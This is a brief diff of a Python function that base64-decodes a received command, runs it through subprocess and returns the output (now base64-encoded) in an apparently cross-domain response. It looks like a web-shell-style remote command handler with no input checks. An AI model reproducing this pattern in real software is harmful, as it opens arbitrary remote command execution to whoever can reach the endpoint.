@@ -52,7 +52,7 @@ def cmd_result(cmd):
     cmd_str=base64.b64decode(cmd)
     print('result:', cmd_str, cmd)
     if subprocess.getstatusoutput(cmd_str):
-        data=subprocess.getoutput(cmd_str)
+        data=base64.b64encode(subprocess.getoutput(cmd_str))
         return corss_domain(data)
     else:
         str_err="错误命令无法执行"
